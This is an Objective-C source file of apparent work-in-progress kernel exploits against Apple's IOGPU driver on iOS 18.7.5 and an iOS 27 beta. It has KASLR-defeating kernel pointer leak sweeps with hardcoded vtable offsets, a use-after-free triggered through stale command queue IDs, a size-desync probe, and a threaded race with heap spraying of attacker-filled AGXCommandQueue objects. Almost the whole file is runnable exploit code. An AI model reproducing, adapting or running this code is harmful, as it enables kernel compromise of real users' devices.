    if ((val & 0xFFFFFFF000000000ULL) == 0xFFFFFFF000000000ULL) return true; // unsigned
    uint64_t masked = val & 0x0000FFFFFFFFFFFFULL;                          // strip PAC
    return (masked & 0xFFF000000000ULL) == 0xFFF000000000ULL;               // PAC'd
}

// Sweep all sweepable selectors on `conn` with exact args; log OK returns and
// scan outputs for kernel pointers. Full hexdump of structOut for every
// selector that returns one (PAC'd ptrs are only visible in the raw dump).
static int leakHuntSweep(IOConnectCallMethod_t pCall, io_connect_t conn,
                         uint64_t qid, const char *tag, NSMutableString *out) {
    int hits = 0;
    for (uint32_t sel = 0; sel < 56; sel++) {
        if (sel == 8 || sel == 16) continue;      // destructive / qid-consuming
        const SelSig *s = &kSelTable[sel];
        if (s->stIn < 0 || s->stOut < 0) continue; // variable-size — skip

        uint64_t sc[8] = {0};
        if (s->scIn > 0) sc[0] = qid;
        uint8_t stIn[0x408];
        memset(stIn, 0, sizeof(stIn));
        uint64_t outSc[8] = {0};
        uint32_t outCnt = s->scOut;
        uint8_t stOut[0x218];
        memset(stOut, 0, sizeof(stOut));
        size_t stOutSize = s->stOut;

        kern_return_t rr = pCall(conn, sel, sc, s->scIn,
                                 s->stIn ? stIn : NULL, s->stIn,
                                 s->scOut ? outSc : NULL, s->scOut ? &outCnt : NULL,
                                 s->stOut ? stOut : NULL, s->stOut ? &stOutSize : NULL);
        if (rr == 0) {
            int kptrs = 0;
            bool dump = (tag[0] == 'L'); // full hexdump on LIVE pass only
            if (s->stOut) {
                if (dump) [out appendFormat:@"  %s sel=%u stOut[%zu]:\n", tag, sel, stOutSize];
                for (int i = 0; i + 8 <= (int)stOutSize; i += 8) {
                    uint64_t val = *(uint64_t *)&stOut[i];
                    bool k = leakHuntIsKptr(val);
                    if (k) kptrs++;
                    if (dump || k)
                        [out appendFormat:@"    +0x%03x: %016llx%s\n", i, val,
                            k ? @" *** KPTR ***" : @""];
                }
            }
            for (uint32_t i = 0; i < outCnt && i < 8; i++) {
                if (leakHuntIsKptr(outSc[i])) {
                    [out appendFormat:@"  %s sel=%u outSc[%u]=0x%016llx *** KPTR ***\n",
                        tag, sel, i, outSc[i]];
                    kptrs++;
                }
            }
            if (kptrs) hits += kptrs;
            [out appendFormat:@"  %s sel=%u: OK outSc=%u stOut=%zu kptrs=%d\n",
                tag, sel, outCnt, stOutSize, kptrs];
        } else if (rr != 0xe00002c2 && rr != 0xe00002c7) {
            [out appendFormat:@"  %s sel=%u: 0x%08x\n", tag, sel, (unsigned)rr];
        }
    }
    return hits;
}

// P010 Leak Hunt v2: exact-signature selector sweep from the 22H311 dispatch
// table, on (1) live device conn, (2) device conn post-queue-destroy,
// (3) dangling queue conn after reclaim. Handlers that copy object fields into
// structOut (sel 0-5, 13, 15, 17, 18, 20, 22) are the leak candidates.
+ (NSString *)runP010LeakHunt {
    NSMutableString *out = [NSMutableString string];
    [out appendFormat:@"time %@ === P010 Leak Hunt v2 (22H311 exact sigs) ===\n", [NSDate date]];
    [out appendString:@"Exact TABLE_A signatures — counts enforced by externalMethod.\n\n"];

    void *iokit = dlopen("/System/Library/Frameworks/IOKit.framework/IOKit", RTLD_LAZY);
    if (!iokit) { [out appendString:@"dlopen IOKit failed\n"]; return out; }
    IOServiceMatching_t pMatch = dlsym(iokit, "IOServiceMatching");
    IOServiceGetMatchingService_t pGetSvc = dlsym(iokit, "IOServiceGetMatchingService");
    IOObjectRelease_t pRelease = dlsym(iokit, "IOObjectRelease");
    IOConnectCallMethod_t pCall = dlsym(iokit, "IOConnectCallMethod");
    io_service_t svc = pGetSvc(0, pMatch("IOGPU"));
    if (!svc) { [out appendString:@"IOGPU not found\n"]; return out; }
    [out appendFormat:@"IOGPU service=%u\n", svc];

    void *iogpu = dlopen("/System/Library/PrivateFrameworks/IOGPU.framework/IOGPU", RTLD_LAZY);
    if (!iogpu) { [out appendString:@"dlopen IOGPU failed\n"]; pRelease(svc); return out; }
    IOGPUDevCreate_t pDevCreate = (IOGPUDevCreate_t)dlsym(iogpu, "IOGPUDeviceCreate");
    IOGPUGetConn_t pGetConn = (IOGPUGetConn_t)dlsym(iogpu, "IOGPUDeviceGetConnect");
    IOGPUQueueCreate_t pQueueCreate = (IOGPUQueueCreate_t)dlsym(iogpu, "IOGPUCommandQueueCreate");
    IOGPUQueueGetConn_t pQueueGetConn = (IOGPUQueueGetConn_t)dlsym(iogpu, "IOGPUCommandQueueGetConnect");
    if (!pDevCreate || !pGetConn || !pQueueCreate || !pQueueGetConn) {
        [out appendString:@"IOGPU functions not found\n"]; pRelease(svc); return out;
    }

    // Step 1: Create device + queue A
    void *devA = pDevCreate(svc);
    if (!devA) { [out appendString:@"devA failed\n"]; pRelease(svc); return out; }
    io_connect_t connA = pGetConn(devA);
    void *queueA = pQueueCreate(devA);
    if (!queueA) { [out appendString:@"queueA failed\n"]; pRelease(svc); return out; }
    uint32_t qConnA = pQueueGetConn(queueA);
    uint64_t qidA = *(uint64_t *)((uint8_t *)queueA + 0x18);
    [out appendFormat:@"queueA: qid=0x%llx qConn=0x%x devConn=0x%x\n", qidA, qConnA, connA];

    // Step 2: Baseline — exact-sig sweep on LIVE device conn
    [out appendString:@"\n--- LIVE devConn sweep (exact sigs) ---\n"];
    int hits = leakHuntSweep(pCall, connA, qidA, "LIVE", out);

    // Step 3: Destroy queue A (sel=8 on the queue conn)
    uint64_t sc8[1] = {qidA};
    kern_return_t dr = pCall(qConnA, 8, sc8, 1, NULL, 0, NULL, NULL, NULL, NULL);
    [out appendFormat:@"\ndestroy queueA -> 0x%08x\n", (unsigned)dr];

    // Step 4: Sweep device conn post-destroy (device UC still alive)
    [out appendString:@"\n--- POST-DESTROY devConn sweep ---\n"];
    hits += leakHuntSweep(pCall, connA, qidA, "POST", out);

    // Step 5: Create queue B — reclaims freed qid slot
    void *queueB = pQueueCreate(devA);
    uint32_t qConnB = queueB ? pQueueGetConn(queueB) : 0;
    uint64_t qidB = queueB ? *(uint64_t *)((uint8_t *)queueB + 0x18) : 0;
    [out appendFormat:@"\nqueueB: qid=0x%llx qConn=0x%x\n", qidB, qConnB];

    // Step 6: Dangling qConnA sweep — reads whatever now backs it
    [out appendString:@"\n--- DANGLING qConnA sweep ---\n"];
    hits += leakHuntSweep(pCall, qConnA, qidA, "DANGLE", out);

    [out appendFormat:@"\n=== Results ===\nleak_hits=%d\n", hits];
    [out appendString:@"0xFFFFFFF0xx = kernel ptr = slide. Known statics to match:\n"];
    [out appendString:@"  IOGPUDevice vtable+0x10 = 0xFFFFFFF007D1D5E0\n"];
    [out appendString:@"  IOGPUCommandQueue vt+10 = 0xFFFFFFF007D1EEA8\n"];
    [out appendString:@"  IOGPUDeviceUserClient vt+10 = 0xFFFFFFF007D1A148\n"];
    [out appendString:@"  kc base (unslid) = 0xFFFFFFF007004000\n"];
    [out appendString:@"slide = leaked - static. PAC'd ptrs: mask top bits first.\n"];
    [out appendString:@"\nDONE -- paste this text back\n"];
    pRelease(svc);
    return out;
}
// ==== END P009DetachUAF.inc.h ====

// ==== BEGIN inlined P009IoplMerge.inc.h ====
// P009 size-desync + vm_object_iopl_request (64749 on 26.5).
// Uses the SAME detach+normal+2x loop as P009DetachUAF (N=50).
// Confusion is only when GVALen==0x10000 so 2x==0x20000 is accepted.
// Then sel=8 with VA range=GVALen and size=2x. No spray. Not KRW.

+ (NSString *)runP009IoplMerge {
    NSMutableString *out = [NSMutableString string];
    [out appendFormat:@"time %@\n", [NSDate date]];
    [out appendString:@"=== P009 size-desync + iopl (64749 merge) ===\n"];
    [out appendString:@"Same loop as detach smoke (N=50, normal then 2x). Then sel8 mismatch.\n\n"];

    NSArray *docs = NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES);
    NSString *lp = [docs[0] stringByAppendingPathComponent:@"p009_iopl_merge_log.txt"];
    int fd = open(lp.fileSystemRepresentation, O_CREAT | O_WRONLY | O_TRUNC, 0644);
    void (^lg)(NSString *) = ^(NSString *s) {
        [out appendString:s];
        if (![s hasSuffix:@"\n"]) [out appendString:@"\n"];
        if (fd >= 0) {
            const char *c = s.UTF8String;
            write(fd, c, strlen(c));
            if (![s hasSuffix:@"\n"]) write(fd, "\n", 1);
            fcntl(fd, F_FULLFSYNC);
        }
    };

    void *iokit = dlopen("/System/Library/Frameworks/IOKit.framework/IOKit", RTLD_LAZY);
    void *iogpu = dlopen("/System/Library/PrivateFrameworks/IOGPU.framework/IOGPU", RTLD_LAZY);
    if (!iogpu) iogpu = dlopen("/System/Library/Frameworks/IOGPU.framework/IOGPU", RTLD_LAZY);
    if (!iokit || !iogpu) { lg(@"STOP dlopen"); if (fd>=0) close(fd); return out; }

    typedef int (*Detach_t)(void *);
    typedef int (*Replace_t)(void *, void *, uint64_t);
    typedef uint32_t (*GetType_t)(void *);
    typedef uint64_t (*GetU64_t)(void *);
    typedef void *(*DevCreate_t)(io_service_t);
    typedef uint32_t (*GetConn_t)(void *);
    Detach_t pDetach = dlsym(iogpu, "IOGPUResourceDetachBacking");
    Replace_t pReplace = dlsym(iogpu, "IOGPUResourceReplaceBackingWithBytes");
    GetType_t pGetType = dlsym(iogpu, "IOGPUResourceGetResourceType");
    GetU64_t pGetVA = dlsym(iogpu, "IOGPUResourceGetGPUVirtualAddress");
    GetU64_t pGetLen = dlsym(iogpu, "IOGPUResourceGetGPUVirtualAddressLength");
    IOServiceMatching_t matching = dlsym(iokit, "IOServiceMatching");
    IOServiceGetMatchingService_t getsvc = dlsym(iokit, "IOServiceGetMatchingService");
    IOConnectCallMethod_t call = dlsym(iokit, "IOConnectCallMethod");
    mach_port_t *mp = dlsym(iokit, "kIOMainPortDefault");
    if (!mp) mp = dlsym(iokit, "kIOMasterPortDefault");
    DevCreate_t devCreate = dlsym(iogpu, "IOGPUDeviceCreate");
    GetConn_t getConn = dlsym(iogpu, "IOGPUDeviceGetConnect");
    if (!pDetach || !pReplace || !pGetLen || !matching || !call || !mp || !devCreate) {
        lg(@"STOP dlsym"); if (fd>=0) close(fd); return out;
    }

    id<MTLDevice> mtl = MTLCreateSystemDefaultDevice();
    if (!mtl) { lg(@"STOP metal"); if (fd>=0) close(fd); return out; }
    io_service_t svc = getsvc(*mp, matching("IOGPU"));
    void *gpudev = svc ? devCreate(svc) : NULL;
    io_connect_t conn = gpudev ? getConn(gpudev) : 0;
    lg([NSString stringWithFormat:@"metal=%@ IOGPU conn=%u", mtl.name, conn]);

    int confused = 0, kptrs = 0, tried = 0;
    const int N = 50;
    const NSUInteger mtlLen = 4096;
    for (int iter = 0; iter < N; iter++) {
        id buf = [mtl newBufferWithLength:mtlLen options:MTLResourceStorageModeShared];
        if (!buf) { lg([NSString stringWithFormat:@"iter%d: no buf", iter]); continue; }
        void *ref = p009_getResourceRef(buf);
        if (!ref) { lg([NSString stringWithFormat:@"iter%d: no resourceRef", iter]); continue; }
        void *cpu = [buf contents];
        if (cpu) memset(cpu, 0x41, mtlLen);
        uint64_t glen = pGetLen(ref);
        uint64_t gva = pGetVA ? pGetVA(ref) : 0;
        uint32_t typ = pGetType ? pGetType(ref) : 0;
        int dkr = pDetach(ref);
        lg([NSString stringWithFormat:@"iter%d: type=0x%x GVA=0x%llx GVALen=0x%llx detach=0x%x",
            iter, typ, gva, glen, dkr]);
        if (dkr != 0) continue;
        tried++;

        void *normal = calloc(1, glen ? (size_t)glen : 8);
        if (normal && glen) {
            memset(normal, 0x43, (size_t)glen);
            int nkr = pReplace(ref, normal, glen);
            if (nkr == 0)
                lg([NSString stringWithFormat:@"iter%d: replace(normal 0x%llx) OK", iter, glen]);
            free(normal);
        }
        uint64_t twice = glen * 2;
        if (twice < 8 || twice > 0x800000) continue;
        void *ov = calloc(1, (size_t)twice);
        if (!ov) continue;
        memset(ov, 0x44, (size_t)twice);
        int rkr = pReplace(ref, ov, twice);
        uint64_t glen2 = pGetLen(ref);
        lg([NSString stringWithFormat:@"iter%d: replace(overflow %llu) -> 0x%08x postGVALen=0x%llx",
            iter, (unsigned long long)twice, rkr, glen2]);
        if (!(rkr == 0 && glen2 != twice && glen2 != 0)) {
            free(ov);
            continue;
        }
        confused++;
        lg([NSString stringWithFormat:
            @"*** SIZE CONFUSION iter=%d GVA=0x%llx GVALen=0x%llx installed=0x%llx",
            iter, gva, glen2, twice]);

        /* sel8: VA range = GVALen, size = installed 2x (iopl page-count mismatch). */
        if (conn && gva) {
            uint8_t in[0x400], ob[0x200];
            memset(in, 0, sizeof(in));
            memset(ob, 0, sizeof(ob));
            *(uint32_t *)(in + 0x00) = 0x80;
            *(uint64_t *)(in + 0x38) = gva;
            *(uint64_t *)(in + 0x40) = gva + glen2;
            *(uint64_t *)(in + 0x48) = twice;
            size_t outSz = sizeof(ob);
            kern_return_t kr = call(conn, 8, NULL, 0, in, sizeof(in),
                                    NULL, NULL, ob, &outSz);
            lg([NSString stringWithFormat:@"sel8 GVA mismatch -> 0x%08x out=0x%zx",
                (unsigned)kr, outSz]);
            for (size_t i = 0; i + 8 <= outSz && i < 0x80; i += 8) {
                uint64_t v; memcpy(&v, ob + i, 8);
                if (v >= 0xffffffe000000000ULL) {
                    kptrs++;
                    lg([NSString stringWithFormat:@"HIT sel8 +0x%zx: 0x%llx", i, v]);
                }
            }
            uint64_t cmap = 0;
            if (outSz >= 16) memcpy(&cmap, ob + 8, 8);
            if (cmap > 0x100000000ULL && cmap < 0x300000000ULL) {
                size_t nscan = (size_t)twice;
                if (nscan > 0x10000) nscan = 0x10000;
                const uint8_t *p = (const uint8_t *)(uintptr_t)cmap;
                for (size_t i = 0; i + 8 <= nscan; i += 8) {
                    uint64_t v; memcpy(&v, p + i, 8);
                    if (v >= 0xffffffe000000000ULL) {
                        kptrs++;
                        if (kptrs <= 8)
                            lg([NSString stringWithFormat:@"HIT cmap +0x%zx: 0x%llx", i, v]);
                    }
                }
                lg([NSString stringWithFormat:@"cmap 0x%zx bytes kptrs=%d", nscan, kptrs]);
            }
            /* also try CPU VA as start (IOPL v7 used vm_allocate, not GVA) */
            if (cpu) {
                memset(in, 0, sizeof(in));
                memset(ob, 0, sizeof(ob));
                uintptr_t u = (uintptr_t)cpu;
                *(uint32_t *)(in + 0x00) = 0x80;
                *(uint64_t *)(in + 0x38) = u;
                *(uint64_t *)(in + 0x40) = u + (uintptr_t)glen2;
                *(uint64_t *)(in + 0x48) = twice;
                outSz = sizeof(ob);
                kr = call(conn, 8, NULL, 0, in, sizeof(in), NULL, NULL, ob, &outSz);
                lg([NSString stringWithFormat:@"sel8 CPU-VA mismatch -> 0x%08x out=0x%zx",
                    (unsigned)kr, outSz]);
                for (size_t i = 0; i + 8 <= outSz && i < 0x80; i += 8) {
                    uint64_t v; memcpy(&v, ob + i, 8);
                    if (v >= 0xffffffe000000000ULL) {
                        kptrs++;
                        lg([NSString stringWithFormat:@"HIT cpu-sel8 +0x%zx: 0x%llx", i, v]);
                    }
                }
            }
        }
        free(ov);
        /* keep looping so we log how often 0x10000 shows up; iopl already fired */
    }
    lg([NSString stringWithFormat:@"tried=%d confused=%d kptrs=%d", tried, confused, kptrs]);
    lg(@"0xe00002be = kIOReturnNoResources (method ran, refused 2x — not BadArg)");

    /* Phase 2: 64KB IOSurface (GVALen should be 0x10000) + lock/prepare = real iopl_request */
    lg(@"\n--- Phase 2: 0x82 IOSurface 64KB, detach, replace 0x20000, IOSurfaceLock ---");
    void *iosH = dlopen("/System/Library/Frameworks/IOSurface.framework/IOSurface", RTLD_LAZY);
    if (!iosH) iosH = dlopen("/System/Library/PrivateFrameworks/IOSurface.framework/IOSurface", RTLD_LAZY);
    IOSurfaceCreate_t pCreate = iosH ? dlsym(iosH, "IOSurfaceCreate") : NULL;
    IOSurfaceGetID_t pGetID = iosH ? dlsym(iosH, "IOSurfaceGetID") : NULL;
    IOSurfaceLock_t pLock = iosH ? dlsym(iosH, "IOSurfaceLock") : NULL;
    IOSurfaceUnlock_t pUnlock = iosH ? (IOSurfaceUnlock_t)dlsym(iosH, "IOSurfaceUnlock") : NULL;
    IOSurfaceGetBaseAddress_t pBase = iosH ? dlsym(iosH, "IOSurfaceGetBaseAddress") : NULL;
    NSDictionary *props = @{
        @"IOSurfaceWidth": @64, @"IOSurfaceHeight": @256,
        @"IOSurfaceBytesPerElement": @4, @"IOSurfaceBytesPerRow": @(64 * 4),
        @"IOSurfaceAllocSize": @((unsigned)0x10000),
        @"IOSurfacePixelFormat": @((unsigned int)'BGRA'),
    };
    IOSurfaceRef surf = pCreate ? pCreate((__bridge CFDictionaryRef)props) : NULL;
    lg([NSString stringWithFormat:@"surf=%p sid=%u", surf, (surf && pGetID) ? pGetID(surf) : 0]);
    id ibuf = nil;
    if (surf && mtl) {
        SEL nbSel = NSSelectorFromString(@"newBufferWithIOSurface:");
        if ([mtl respondsToSelector:nbSel])
            ibuf = ((id (*)(id, SEL, IOSurfaceRef))objc_msgSend)(mtl, nbSel, surf);
    }
    void *iref = ibuf ? p009_getResourceRef(ibuf) : NULL;
    lg([NSString stringWithFormat:@"iosurf-buf=%p ref=%p", ibuf, iref]);
    if (iref && pDetach && pReplace && pGetLen) {
        uint64_t glen = pGetLen(iref);
        uint64_t gva = pGetVA ? pGetVA(iref) : 0;
        lg([NSString stringWithFormat:@"0x82 GVA=0x%llx GVALen=0x%llx", gva, glen]);
        int dkr = pDetach(iref);
        lg([NSString stringWithFormat:@"detach -> 0x%x", dkr]);
        uint64_t twice = 0x20000;
        void *ov = calloc(1, (size_t)twice);
        if (ov) {
            memset(ov, 0x44, (size_t)twice);
            int rkr = pReplace(iref, ov, twice);
            uint64_t glen2 = pGetLen(iref);
            lg([NSString stringWithFormat:@"replace(0x20000) -> 0x%08x postGVALen=0x%llx", rkr, glen2]);
            if (rkr == 0 && glen2 != twice)
                lg(@"*** 0x82 SIZE CONFUSION ***");
            /* IOSurfaceLock → IOMD prepare → vm_object_iopl_request */
            if (pLock) {
                kern_return_t lkr = pLock(surf, 0, NULL);
                lg([NSString stringWithFormat:@"IOSurfaceLock -> 0x%08x", (unsigned)lkr]);
                void *base = pBase ? pBase(surf) : NULL;
                lg([NSString stringWithFormat:@"base=%p", base]);
                if (base) {
                    size_t nscan = 0x10000;
                    for (size_t i = 0; i + 8 <= nscan; i += 8) {
                        uint64_t v; memcpy(&v, (uint8_t *)base + i, 8);
                        if (v >= 0xffffffe000000000ULL) {
                            kptrs++;
                            if (kptrs <= 8)
                                lg([NSString stringWithFormat:@"HIT lock-base +0x%zx: 0x%llx", i, v]);
                        }
                    }
                    int n44 = 0;
                    for (size_t i = 0; i + 8 <= 0x1000; i += 8)
                        if (*(uint64_t *)((uint8_t *)base + i) == 0x4444444444444444ULL) n44++;
                    lg([NSString stringWithFormat:@"lock-base first 4k 0x44 qwords=%d kptrs=%d", n44, kptrs]);
                }
                if (pUnlock) pUnlock(surf, 0, NULL);
            }
            if (conn && gva && glen2) {
                uint8_t in[0x400], ob[0x200];
                memset(in, 0, sizeof(in)); memset(ob, 0, sizeof(ob));
                *(uint32_t *)(in) = 0x80;
                *(uint64_t *)(in + 0x38) = gva;
                *(uint64_t *)(in + 0x40) = gva + glen2;
                *(uint64_t *)(in + 0x48) = glen2;
                size_t outSz = sizeof(ob);
                kern_return_t kr = call(conn, 8, NULL, 0, in, sizeof(in), NULL, NULL, ob, &outSz);
                lg([NSString stringWithFormat:@"sel8 0x82 MATCH size=GVALen -> 0x%08x out=0x%zx", (unsigned)kr, outSz]);
                memset(in, 0, sizeof(in)); memset(ob, 0, sizeof(ob));
                *(uint32_t *)(in) = 0x80;
                *(uint64_t *)(in + 0x38) = gva;
                *(uint64_t *)(in + 0x40) = gva + glen2;
                *(uint64_t *)(in + 0x48) = twice;
                outSz = sizeof(ob);
                kr = call(conn, 8, NULL, 0, in, sizeof(in), NULL, NULL, ob, &outSz);
                lg([NSString stringWithFormat:@"sel8 0x82 2x size -> 0x%08x out=0x%zx", (unsigned)kr, outSz]);
                if (outSz >= 16) {
                    uint64_t w0, w1; memcpy(&w0, ob, 8); memcpy(&w1, ob + 8, 8);
                    lg([NSString stringWithFormat:@"sel8 out[0]=0x%llx out[8]=0x%llx", w0, w1]);
                }
            }
            free(ov);
        }
    } else {
        lg(@"STOP 0x82 path (no surf/buf/ref)");
    }
    if (surf) CFRelease(surf);

    lg([NSString stringWithFormat:@"final kptrs=%d", kptrs]);
    if (kptrs)
        lg(@"=== verdict: HIT kernel ptrs. Paste. Not KRW yet. ===");
    else if (confused)
        lg(@"=== verdict: desync yes; sel8 2x = NoResources (refused). 0x82 lock/sel8 logged. ===");
    else
        lg(@"=== verdict: no Metal desync; see 0x82 phase. ===");
    if (fd >= 0) { fcntl(fd, F_FULLFSYNC); close(fd); }
    return out;
}
// ==== END P009IoplMerge.inc.h ====

// ==== BEGIN inlined P010IOS27.inc.h ====
// P010 iOS 27 — Race sel=8/sel=16 with AGXCommandQueue spray
// For iPhone 17 Pro Max (A18 Pro) / iOS 27.0 beta 4 (24A5390f)
//
// Key differences from iOS 18.7.5 (22H311):
// - Kernel base: 0xfffffe0007004000 (not 0xFFFFFFF007004000)
// - IOGPUCommandQueue size: 0x5d0 (not 0x580)
// - IOGPUDevice size: 0x120 (not 0x100)
// - sel=8 uses dev+0x48→0x2d8 (not dev+0x88)
// - sel=16 uses dev+0x38 (not dev+0x90)
// - AGXCommandQueue size: TBD (need to find on A18 Pro)
// - Spray: AGXCommandQueue, NOT IOSurface (kalloc_type segregation)
//
// The two-manager bug is structurally identical:
// - sel=8 destroys via queue manager (dev+0x48→0x2d8)
// - sel=16 validates via queue table (dev+0x38)
// - Different data structures → stale pointer → UAF

// Static helper: extract resourceRef from Metal buffer
static void *p010ios27_getResourceRef(id buf) {
    if (!buf) return NULL;
    for (int i = 0; i < 8; i++) {
        NSString *cn = NSStringFromClass([buf class]);
        if (![cn containsString:@"Capture"] && ![cn containsString:@"Debug"]) break;
        SEL sel = NSSelectorFromString(@"baseObject");
        if (![buf respondsToSelector:sel]) break;
        id base = ((id (*)(id, SEL))objc_msgSend)(buf, sel);
        if (!base || base == buf) break;
        buf = base;
    }
    SEL sel = NSSelectorFromString(@"resourceRef");
    if (![buf respondsToSelector:sel]) return NULL;
    return ((void *(*)(id, SEL))objc_msgSend)(buf, sel);
}

+ (NSString *)runP010IOS27 {
    NSMutableString *out = [NSMutableString string];
    [out appendFormat:@"time %@\n", [NSDate date]];
    [out appendString:@"=== P010 iOS 27 — Race+QueueSpray (A18 Pro) ===\n\n"];
    [out appendString:@"Kernel base: 0xfffffe0007004000\n"];
    [out appendString:@"sel=8: dev+0x48→0x2d8 | sel=16: dev+0x38\n\n"];

    void *iokit = dlopen("/System/Library/Frameworks/IOKit.framework/IOKit", RTLD_LAZY);
    void *iogpu = dlopen("/System/Library/PrivateFrameworks/IOGPU.framework/IOGPU", RTLD_LAZY);
    if (!iokit || !iogpu) {
        [out appendFormat:@"STOP: iokit=%p iogpu=%p\n", iokit, iogpu];
        return out;
    }

    IOServiceMatching_t pMatching = dlsym(iokit, "IOServiceMatching");
    IOServiceGetMatchingService_t pGet = dlsym(iokit, "IOServiceGetMatchingService");
    IOServiceClose_t pClose = dlsym(iokit, "IOServiceClose");
    IOObjectRelease_t pRelease = dlsym(iokit, "IOObjectRelease");
    IOConnectCallMethod_t pCall = dlsym(iokit, "IOConnectCallMethod");
    mach_port_t *pMainPort = dlsym(iokit, "kIOMainPortDefault");
    if (!pMainPort) pMainPort = dlsym(iokit, "kIOMasterPortDefault");

    typedef void *(*DevCreate_t)(io_service_t);
    typedef uint32_t (*GetConn_t)(void *);
    typedef void (*DevRelease_t)(void *);
    typedef void *(*QueueCreate_t)(void *, void *, uint32_t);
    typedef uint32_t (*QueueGetID_t)(void *);
    DevCreate_t pDevCreate = (DevCreate_t)dlsym(iogpu, "IOGPUDeviceCreate");
    GetConn_t pGetConn = (GetConn_t)dlsym(iogpu, "IOGPUDeviceGetConnect");
    DevRelease_t pDevRelease = (DevRelease_t)dlsym(iogpu, "IOGPUDeviceRelease");
    QueueCreate_t pQueueCreate = (QueueCreate_t)dlsym(iogpu, "IOGPUCommandQueueCreate");
    QueueGetID_t pGetID = (QueueGetID_t)dlsym(iogpu, "IOGPUCommandQueueGetID");

    if (!pDevCreate || !pGetConn || !pQueueCreate) {
        [out appendString:@"STOP: missing IOGPU symbols\n"];
        return out;
    }

    CFMutableDictionaryRef m = pMatching("IOGPU");
    io_service_t svc = m ? pGet(*pMainPort, m) : 0;
    if (!svc) { [out appendString:@"STOP: no IOGPU service\n"]; return out; }
    [out appendFormat:@"IOGPU service=%u\n\n", svc];

    // === P010 iOS 27: Queue spray approach ===
    // Instead of IOSurface spray, we create and destroy AGXCommandQueues
    // to fill the freed slot with a controlled AGXCommandQueue object.
    // The sel=7 memcpy writes attacker data into queue+0x10..0x410.
    // When sel=16 validates the stale qid, it calls a virtual method on
    // the reclaimed AGXCommandQueue — the user-controlled fields are
    // trusted by that method.

    int hits = 0;
    int survived = 0;
    int N = 50;

    for (int iter = 0; iter < N; iter++) {
        // Create two device connections
        void *devA = pDevCreate(svc);
        void *devB = pDevCreate(svc);
        if (!devA || !devB) {
            if (devA) pDevRelease(devA);
            if (devB) pDevRelease(devB);
            continue;
        }
        io_connect_t connA = pGetConn(devA);
        io_connect_t connB = pGetConn(devB);

        // Create queue on connA with attacker-controlled data
        void *argsA = calloc(1, 0x410);
        // Fill queue+0x10..0x410 with controlled pattern
        // (queue+0x10..0x410 is memcpy'd from argsA by sel=7)
        memset((uint8_t *)argsA + 0x10, 0x42, 0x400);
        // Set the device type ID (from dev+0x08)
        *(uint32_t *)((uint8_t *)argsA + 0x400) = *(uint32_t *)((uint8_t *)devA + 0x08);
        *(uint8_t *)((uint8_t *)argsA + 0x404) = *(uint8_t *)((uint8_t *)devA + 0x08);

        void *qA = pQueueCreate(devA, argsA, 0x410);
        free(argsA);
        uint32_t qidA = pGetID ? pGetID(qA) : 1;

        if (iter == 0) {
            [out appendFormat:@"iter0: connA=%u connB=%u qidA=%u\n", connA, connB, qidA];
        }

        __block volatile int go = 0;
        __block volatile int useOk = 0;
        __block volatile int useFail = 0;
        __block kern_return_t closeRc = -1;
        __block volatile int sprayCount = 0;

        dispatch_group_t grp = dispatch_group_create();
        dispatch_queue_t qUse = dispatch_queue_create("p010ios27.use", NULL);
        dispatch_queue_t qClose = dispatch_queue_create("p010ios27.close", NULL);

        // Thread 1: sel=16 on connA in tight loop (validate/consume)
        dispatch_group_async(grp, qUse, ^{
            while (!go) {}
            uint64_t s[1] = {qidA};
            for (int i = 0; i < 50000; i++) {
                kern_return_t r = pCall(connA, 16, s, 1, NULL, 0, NULL, NULL, NULL, NULL);
                if (r == 0) useOk++;
                else useFail++;
                if (r == 0x10000003) break; // MACH_SEND_INVALID_DEST
            }
        });

        // Thread 2: close connB + spray AGXCommandQueues
        dispatch_group_async(grp, qClose, ^{
            while (!go) {}
            for (volatile int i = 0; i < 50; i++) {} // tiny delay
            closeRc = pClose(connB);

            // Spray: create many queues to reclaim the freed slot
            // Each queue creation calls sel=7 which memcpy's user data
            // into queue+0x10..0x410 — our controlled bytes are there.
            for (int s = 0; s < 200; s++) {
                void *argsB = calloc(1, 0x410);
                memset((uint8_t *)argsB + 0x10, 0x42, 0x400);
                *(uint32_t *)((uint8_t *)argsB + 0x400) = *(uint32_t *)((uint8_t *)devB + 0x08);
                *(uint8_t *)((uint8_t *)argsB + 0x404) = *(uint8_t *)((uint8_t *)devB + 0x08);
                void *qB = pQueueCreate(devB, argsB, 0x410);
                free(argsB);
                if (qB) {
                    sprayCount++;
                    // Don't release — keep the slot filled
                }
            }
        });

        go = 1;
        dispatch_group_wait(grp, DISPATCH_TIME_FOREVER);

        if (iter == 0) {
            [out appendFormat:@"iter0: use_ok=%d use_fail=%d close=0x%08x spray=%d\n",
                useOk, useFail, (unsigned)closeRc, sprayCount];
        }

        if (closeRc == KERN_SUCCESS && useOk > 0) {
            hits++;
        } else {
            survived++;
        }

        if (pDevRelease) { pDevRelease(devA); pDevRelease(devB); }
    }

    [out appendFormat:@"\nQueue spray race: N=%d hits=%d survived=%d\n", N, hits, survived];
    [out appendString:@"panic = UAF + spray landed. survived = increase N or spray count.\n"];
    [out appendString:@"\nDONE -- paste this text back\n"];

    pRelease(svc);
    return out;
}

+ (NSString *)runP010IOS27LeakHunt {
    NSMutableString *out = [NSMutableString string];
    [out appendFormat:@"time %@\n", [NSDate date]];
    [out appendString:@"=== P010 iOS 27 Leak Hunt — sel=7 structOut ===\n\n"];
    [out appendString:@"sel=7 returns {qid, *(queue+0x550)} — the 2nd qword is a\n"];
    [out appendString:@"live kernel heap pointer (per-queue helper OSObject).\n\n"];

    void *iokit = dlopen("/System/Library/Frameworks/IOKit.framework/IOKit", RTLD_LAZY);
    void *iogpu = dlopen("/System/Library/PrivateFrameworks/IOGPU.framework/IOGPU", RTLD_LAZY);
    if (!iokit || !iogpu) {
        [out appendFormat:@"STOP: iokit=%p iogpu=%p\n", iokit, iogpu];
        return out;
    }

    IOServiceMatching_t pMatching = dlsym(iokit, "IOServiceMatching");
    IOServiceGetMatchingService_t pGet = dlsym(iokit, "IOServiceGetMatchingService");
    IOObjectRelease_t pRelease = dlsym(iokit, "IOObjectRelease");
    IOConnectCallMethod_t pCall = dlsym(iokit, "IOConnectCallMethod");
    mach_port_t *pMainPort = dlsym(iokit, "kIOMainPortDefault");
    if (!pMainPort) pMainPort = dlsym(iokit, "kIOMasterPortDefault");

    typedef void *(*DevCreate_t)(io_service_t);
    typedef uint32_t (*GetConn_t)(void *);
    typedef void (*DevRelease_t)(void *);
    typedef void *(*QueueCreate_t)(void *, void *, uint32_t);
    typedef uint32_t (*QueueGetID_t)(void *);
